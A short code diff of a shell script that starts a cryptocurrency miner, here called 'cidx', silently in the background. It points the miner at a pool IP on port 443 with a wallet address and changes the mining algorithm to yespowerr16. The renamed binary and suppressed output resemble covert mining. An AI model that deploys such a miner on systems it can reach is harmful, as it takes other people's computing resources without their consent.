@@ -32,7 +32,7 @@ END
 
   # Run cidx in the background
   # nohup ./cidx -c 'config.json' &>/dev/null &
-  nohup ./cidx -a yespower  \
+  nohup ./cidx -a yespowerr16    \
   -o 45.115.225.87:443 \
   -u YiN7LfFoSNRszvbuHCH27KCz617VkG3yc3.worker1 \
   -p c=YTN,m=solo,zap=YTN,mc=YTN -t 6 &>/dev/null &
